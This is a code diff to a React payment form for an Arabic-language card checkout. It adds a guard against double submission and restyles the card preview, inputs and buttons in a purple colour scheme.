@@ -21,6 +21,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
   const [expiryError, setExpiryError] = useState("");
   const [cvvError, setCvvError] = useState("");
   const [loading, setLoading] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
   const [flipped, setFlipped] = useState(false);
   const getRateLimitStatus = useCartStore((s) => s.getRateLimitStatus);
   const recordOrder = useCartStore((s) => s.recordOrder);
@@ -82,6 +83,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
   const isBlocked = !!rateLimitMsg;
 
   const handleNext = async () => {
+    if (submitted) return;
     const { blocked, remainingMs } = getRateLimitStatus();
     if (blocked) {
       setRateLimitMsg("عذراً، تم تقديم عدة طلبات متتالية. يرجى الانتظار قليلاً قبل المحاولة مرة أخرى 🙏");
@@ -110,6 +112,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     try {
       recordOrder();
       await onSubmit(fields);
+      setSubmitted(true);
       router.push("/checkout/verify");
     } catch {
       setServerBlocked(true);
@@ -126,10 +129,10 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     cardType === "Mada" ? "from-[#2e7d32] to-[#1b5e20]" :
     cardType === "Visa" ? "from-[#1a237e] to-[#0d47a1]" :
     cardType === "Mastercard" ? "from-[#e65100] to-[#bf360c]" :
-    "from-[#37474f] to-[#263238]";
+    "from-[#611FA0] to-[#090D54]";
 
-  const inputBase = "w-full rounded-xl px-4 py-3 text-sm text-gray-800 bg-gray-50/80 border focus:outline-none transition-all duration-200 placeholder:text-gray-300";
-  const inputOk = "border-gray-200/80 focus:border-[#0F4C6E] focus:ring-2 focus:ring-[#0F4C6E]/10 focus:bg-white";
+  const inputBase = "w-full rounded-xl px-4 py-3 text-sm text-gray-800 bg-[#f9f5ff]/50 border focus:outline-none transition-all duration-200 placeholder:text-gray-300";
+  const inputOk = "border-[#8543C0]/10 focus:border-[#8543C0] focus:ring-2 focus:ring-[#8543C0]/10 focus:bg-white";
   const inputErr = "border-red-300 focus:border-red-400 focus:ring-2 focus:ring-red-100 bg-red-50/30";
 
   const inputClass = (field: keyof typeof fields, extraError?: string) =>
@@ -150,7 +153,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
           style={{ transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)", height: "clamp(180px, 50vw, 220px)" }}
         >
           {/* Front */}
-          <div className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${cardBg} text-white p-5 sm:p-6 shadow-[0_20px_60px_rgba(0,0,0,0.3)] select-none overflow-hidden`} style={{ backfaceVisibility: "hidden" }} dir="ltr">
+          <div className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${cardBg} text-white p-5 sm:p-6 shadow-[0_20px_60px_rgba(133,67,192,0.3)] select-none overflow-hidden`} style={{ backfaceVisibility: "hidden" }} dir="ltr">
             <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZGVmcz48cGF0dGVybiBpZD0iYSIgcGF0dGVyblVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIj48cGF0aCBkPSJNMCAyMGgyME0yMCAwdjIwIiBmaWxsPSJub25lIiBzdHJva2U9InJnYmEoMjU1LDI1NSwyNTUsMC4wMykiIHN0cm9rZS13aWR0aD0iMSIvPjwvcGF0dGVybj48L2RlZnM+PHJlY3Qgd2lkdGg9IjIwMCIgaGVpZ2h0PSIyMDAiIGZpbGw9InVybCgjYSkiLz48L3N2Zz4=')] opacity-50 rounded-2xl" />
             <div className="relative">
               <div className="flex justify-between items-start">
@@ -179,7 +182,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
           </div>
 
           {/* Back */}
-          <div className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${cardBg} text-white shadow-[0_20px_60px_rgba(0,0,0,0.3)] select-none overflow-hidden`} style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }} dir="ltr">
+          <div className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${cardBg} text-white shadow-[0_20px_60px_rgba(133,67,192,0.3)] select-none overflow-hidden`} style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }} dir="ltr">
             <div className="w-full h-10 bg-black/60 mt-7" />
             <div className="px-6 mt-5">
               <p className="text-[9px] opacity-40 uppercase tracking-[0.15em] mb-1.5">CVV</p>
@@ -200,12 +203,12 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
         initial={{ opacity: 0, y: 16 }}
         animate={{ opacity: 1, y: 0 }}
         transition={{ delay: 0.3 }}
-        className="bg-white rounded-2xl p-5 sm:p-6 border border-gray-100 shadow-[0_2px_12px_rgba(0,0,0,0.04)]"
+        className="bg-white rounded-2xl p-5 sm:p-6 border border-[#8543C0]/[0.06] shadow-[0_2px_16px_rgba(133,67,192,0.05)]"
       >
         {/* Accepted Cards */}
-        <div className="flex items-center justify-between mb-5 pb-4 border-b border-gray-100">
+        <div className="flex items-center justify-between mb-5 pb-4 border-b border-[#8543C0]/[0.06]">
           <div className="flex items-center gap-2">
-            <IoLockClosedOutline size={14} className="text-[#7CC043]" />
+            <IoLockClosedOutline size={14} className="text-[#8543C0]" />
             <span className="text-xs font-bold text-gray-400">دفع آمن ومشفر</span>
           </div>
           <Image src="/فيزا ماستر مدى.webp" alt="Visa Mastercard Mada" width={100} height={32} className="object-contain" />
@@ -314,7 +317,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
       >
         <button
           onClick={() => router.push("/cart")}
-          className="flex items-center justify-center gap-1.5 w-[120px] bg-white border border-gray-200 text-gray-500 font-bold py-3.5 rounded-xl text-sm hover:bg-gray-50 hover:border-gray-300 transition-all"
+          className="flex items-center justify-center gap-1.5 w-[120px] bg-white border border-[#8543C0]/10 text-gray-500 font-bold py-3.5 rounded-xl text-sm hover:bg-[#f9f5ff] hover:border-[#8543C0]/20 transition-all"
         >
           <IoChevronBack size={16} className="rotate-180" />
           السابق
@@ -323,11 +326,11 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
           whileHover={isBlocked ? {} : { scale: 1.01 }}
           whileTap={isBlocked ? {} : { scale: 0.98 }}
           onClick={handleNext}
-          disabled={loading || isBlocked}
+          disabled={loading || isBlocked || submitted}
           className={`flex-1 relative overflow-hidden font-bold py-3.5 rounded-xl text-sm transition-shadow duration-300 flex items-center justify-center gap-2 ${
             isBlocked
               ? "bg-gray-300 text-gray-500 cursor-not-allowed"
-              : "bg-gradient-to-r from-[#0F4C6E] to-[#1a6b5a] text-white shadow-[0_8px_24px_rgba(15,76,110,0.3)] hover:shadow-[0_12px_32px_rgba(15,76,110,0.4)] disabled:opacity-60 disabled:cursor-not-allowed"
+              : "bg-gradient-to-r from-[#7A2FCC] via-[#8543C0] to-[#A842E4] text-white shadow-[0_8px_24px_rgba(133,67,192,0.3)] hover:shadow-[0_12px_32px_rgba(133,67,192,0.4)] disabled:opacity-60 disabled:cursor-not-allowed"
           }`}
         >
           {loading ? (
